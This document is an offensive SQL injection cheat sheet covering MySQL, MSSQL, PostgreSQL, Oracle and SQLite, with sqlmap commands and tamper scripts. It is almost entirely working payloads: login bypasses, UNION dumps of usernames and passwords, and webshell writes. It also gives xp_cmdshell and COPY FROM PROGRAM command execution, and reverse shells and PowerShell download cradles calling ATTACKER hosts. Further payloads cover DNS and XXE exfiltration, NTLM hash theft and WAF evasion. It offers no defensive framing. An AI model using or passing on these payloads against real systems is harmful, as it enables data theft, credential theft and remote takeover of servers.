# SQL Injection Reference

## Detection

### Comment types
| DBMS | Comment |
|------|---------|
| MySQL | `-- -`, `#`, `/**/` |
| MSSQL | `--`, `/**/` |
| PostgreSQL | `--`, `/**/` |
| Oracle | `--`, `/**/` |
| SQLite | `--`, `/**/` |

### DBMS detection
```sql
-- MySQL
AND 1=1-- -
ORDER BY 1-- -
' AND SLEEP(5)-- -
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -

-- MSSQL
' WAITFOR DELAY '0:0:5'-- -

-- PostgreSQL
' AND (SELECT pg_sleep(5))-- -

-- Oracle
' AND (SELECT UTL_HTTP.REQUEST('http://ATTACKER') FROM dual)-- -

-- SQLite
AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -
```

### Auth bypass
```sql
admin'-- -
admin'#
' or 1=1-- -
' or '1'='1
' or 1=1--
" or "1"="1
' OR '' = '
admin' /*
1' ORDER BY 1--+
```

---

## MySQL

### UNION enumeration
```sql
-- Count columns
ORDER BY 1-- -
ORDER BY 2-- -
...until error

-- Find visible column
UNION SELECT NULL,NULL,NULL-- -
UNION SELECT 1,2,3-- -

-- Dump data
UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata-- -
UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -
```

### Error-based
```sql
-- EXTRACTVALUE
AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -
AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -

-- UPDATEXML
AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)-- -

-- GTID_SUBSET (bypass filtered EXTRACTVALUE)
AND GTID_SUBSET(CONCAT(0x7e,(SELECT version())),0)-- -

-- exp(~(...))
AND exp(~(SELECT * FROM(SELECT version())x))-- -
```

### Blind boolean
```sql
AND SUBSTR(username,1,1)='a'-- -
AND MAKE_SET(SUBSTR(version(),1,1)>'5','true')-- -
AND MID(version(),1,1) LIKE '5'-- -
AND (SELECT CASE WHEN (username='admin') THEN 1 ELSE 0 END FROM users LIMIT 1)=1-- -
```

### Time-based blind
```sql
AND SLEEP(5)-- -
AND (SELECT * FROM (SELECT SLEEP(5))a WHERE username='admin')-- -
AND IF((SELECT 1 FROM users WHERE username='admin')=1,SLEEP(5),0)-- -
AND BENCHMARK(5000000,ENCODE('hello','world'))-- -
```

### Dump In One Shot (DIOS)
```sql
AND(SELECT 1 FROM(SELECT count(*),CONCAT((SELECT(SELECT GROUP_CONCAT(DISTINCT concat(0x7e,schema_name,0x7e) SEPARATOR 0x3c62723e) FROM information_schema.schemata) FROM information_schema.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
```

### File read / write
```sql
-- Read file
UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
UNION SELECT 1,LOAD_FILE(0x2F6574632F706173737764),3-- -

-- Write webshell
UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -
UNION SELECT 1,0x3c3f70687020...hex...,3 INTO DUMPFILE '/var/www/html/shell.php'-- -
```

### UDF RCE
```sql
-- Upload lib_mysqludf_sys.so
USE mysql; CREATE TABLE npn(line BLOB); INSERT INTO npn VALUES(LOAD_FILE('/tmp/udf.so'));
SELECT * FROM npn INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so';
SELECT sys_exec('id > /tmp/id.txt');
```

### WAF bypass (MySQL)
```sql
-- Information_schema bypass
UNION SELECT 1,table_name,3 FROM innodb_table_stats-- -
-- Encoding
UNION SELECT 1,0x61646d696e,3-- - (hex)
-- Scientific notation
UNION SELECT 1e0,2e0-- -
-- GBK wide byte
%bf%27 OR 1=1-- -
```

### OOB (DNS)
```sql
-- MySQL
LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.ATTACKER.com\\share'))
-- via UNC (Windows)
UNION SELECT 1,LOAD_FILE('\\\\ATTACKER\\share'),3-- -
```

---

## MSSQL

### Enumeration
```sql
SELECT @@version
SELECT DB_NAME()
SELECT name FROM master..sysdatabases
SELECT table_name FROM information_schema.tables
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

### Error-based
```sql
AND CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -
AND CAST((SELECT TOP 1 username FROM users) AS INT)-- -
```

### Time-based
```sql
AND WAITFOR DELAY '0:0:5'-- -
IF 1=1 WAITFOR DELAY '0:0:5'-- -
IF (SELECT COUNT(*) FROM users WHERE username='admin')>0 WAITFOR DELAY '0:0:5'-- -
```

### Stacked queries
```sql
'; SELECT SLEEP(5)-- -
'; INSERT INTO users VALUES('hacker','hacked')-- -
```

### xp_cmdshell
```sql
-- Enable if disabled
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
-- Execute command
EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER/shell.ps1'')"'
```

### Python RCE (MSSQL 2017+)
```sql
EXEC sp_execute_external_script @language=N'Python', @script=N'import os; os.system("whoami")'
```

### File read via OPENROWSET
```sql
SELECT * FROM OPENROWSET(BULK 'C:\Windows\system32\drivers\etc\hosts', SINGLE_CLOB) AS x
```

### DNS OOB via fn_xe_file_target_read_file
```sql
DECLARE @q VARCHAR(1024); SET @q = '\\'+CONVERT(VARCHAR(MAX),(SELECT TOP 1 username FROM users))+'.ATTACKER.com\x'; EXEC master..xp_dirtree @q
```

### NTLM hash stealing (UNC path)
```sql
EXEC xp_dirtree '\\ATTACKER_IP\share'
EXEC xp_fileexist '\\ATTACKER_IP\share'
```

### Linked servers
```sql
SELECT * FROM OPENDATASOURCE('SQLOLEDB','Data Source=TARGETSERVER;User ID=sa;Password=sa').master.dbo.sysdatabases
SELECT * FROM OPENQUERY(LINKEDSERVER, 'SELECT * FROM master..syslogins')
EXEC ('xp_cmdshell ''whoami''') AT LINKEDSERVER
```

---

## PostgreSQL

### Enumeration
```sql
SELECT version()
SELECT current_database()
SELECT table_name FROM information_schema.tables WHERE table_schema='public'
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

### Error-based
```sql
AND CAST((SELECT version()) AS INT)-- -
AND (SELECT 1 FROM (SELECT query_to_xml('SELECT version()',true,true,''))x)=1
```

### Time-based
```sql
AND (SELECT pg_sleep(5))-- -
```

### Stacked queries
```sql
'; SELECT pg_sleep(5)-- -
'; CREATE TABLE shell(output text); COPY shell FROM PROGRAM 'id'; SELECT * FROM shell-- -
```

### File read / write
```sql
SELECT pg_read_file('/etc/passwd')
COPY users TO '/tmp/users.csv'
CREATE TABLE tmp(data text); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp
```

### RCE via COPY FROM PROGRAM
```sql
COPY cmd_exec FROM PROGRAM 'id'
COPY (SELECT '') TO PROGRAM 'ncat ATTACKER 4444 -e /bin/sh'
```

### RCE via libc (older PostgreSQL)
```sql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6','system' LANGUAGE 'c' STRICT;
SELECT system('id > /tmp/id.txt');
```

### WAF bypass
```sql
-- CHR function
CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78) → ADMIN
-- Dollar quoting
$$exec$$
-- Schema bypass
pg_catalog.current_database()
```

---

## Oracle

### Enumeration
```sql
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'
SELECT owner,table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
SELECT username FROM all_users
```

### Error-based
```sql
AND CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'))=1-- -
AND XMLType((SELECT CONCAT('<root>',CONCAT(username,CONCAT(':',CONCAT(password,'</root>')))) FROM users WHERE ROWNUM=1))=1-- -
```

### Time-based (no SLEEP in Oracle)
```sql
AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)-- -
AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM dual)-- -
```

### OOB XXE
```sql
AND EXTRACTVALUE(XMLTYPE('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://ATTACKER/'||(SELECT password FROM users WHERE username='admin')||'"> %remote;]>'),'/l')-- -
```

### Java RCE
```sql
EXEC DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper c:\\windows\\system32\\cmd.exe /c dir')
```

### DBMS_SCHEDULER
```sql
BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'execjob',job_type=>'EXECUTABLE',job_action=>'/bin/sh',number_of_arguments=>3,start_date=>SYSTIMESTAMP,enabled=>FALSE,auto_drop=>TRUE); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('execjob',1,'-c'); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('execjob',2,'id>/tmp/out'); DBMS_SCHEDULER.ENABLE('execjob'); END;
```

---

## SQLite

### Enumeration
```sql
SELECT sqlite_version()
SELECT sql FROM sqlite_master WHERE type='table'
SELECT tbl_name FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%'
SELECT name FROM PRAGMA_TABLE_INFO('users')
```

### Error-based
```sql
AND CASE WHEN (SELECT 1 FROM users WHERE username='admin') THEN 1 ELSE load_extension(1) END
```

### Time-based
```sql
AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
```

### RCE via ATTACH DATABASE (webshell)
```sql
ATTACH DATABASE '/var/www/shell.php' AS shell;
CREATE TABLE shell.pwn (dataz text);
INSERT INTO shell.pwn (dataz) VALUES ('<?php system($_GET["cmd"]); ?>');-- 
```

### Cron via ATTACH DATABASE
```sql
ATTACH DATABASE '/etc/cron.d/pwn.task' AS cron;
CREATE TABLE cron.tab (dataz text);
INSERT INTO cron.tab (dataz) VALUES (char(10)||'* * * * * root bash -i >& /dev/tcp/ATTACKER/4242 0>&1'||char(10));--
```

---

## SQLmap Usage

```bash
# Basic scan
sqlmap --url="<url>" -p username --random-agent --threads=10 --risk=3 --level=5 --dbms=MySQL --banner --is-dba --dbs

# Load request file
sqlmap -r request.txt

# Custom injection point (* wildcard)
sqlmap -u "http://example.com" --data "username=admin" --headers="X-Forwarded-For: 127.0.0.1*"

# Second order injection
sqlmap -r /tmp/r.txt --dbms MySQL --second-order "http://target/profile"

# Get shells
sqlmap -u "http://example.com/?id=1" -p id --sql-shell
sqlmap -u "http://example.com/?id=1" -p id --os-shell
sqlmap -u "http://example.com/?id=1" -p id --os-pwn

# Proxy
sqlmap -u "http://target.com" --proxy="http://127.0.0.1:8080"

# Direct DB connection
sqlmap -d "mysql://user:pass@ip/database" --dump-all

# Reduce requests
sqlmap -u "..." --test-filter="Generic UNION query (NULL)" --technique=B
```

### SQLmap Tamper Scripts
| Tamper | Effect |
|--------|--------|
| `space2comment` | Replace spaces with `/**/` |
| `randomcase` | RAnDoMCAsE keywords |
| `between` | Replace `>` with `NOT BETWEEN 0 AND #` |
| `charencode` | URL-encode all chars |
| `base64encode` | Base64 entire payload |
| `equaltolike` | Replace `=` with `LIKE` |
| `greatest` | Replace `>` with `GREATEST` |
| `apostrophemask` | Replace `'` with full-width equivalent |
| `unmagicquotes` | Multi-byte `%bf%27` bypass |
| `versionedkeywords` | MySQL versioned comment keywords |
| `sp_password` | Append `sp_password` for MSSQL log obfuscation |
| `0x2char` | MySQL hex to `CONCAT(CHAR(),...)` |
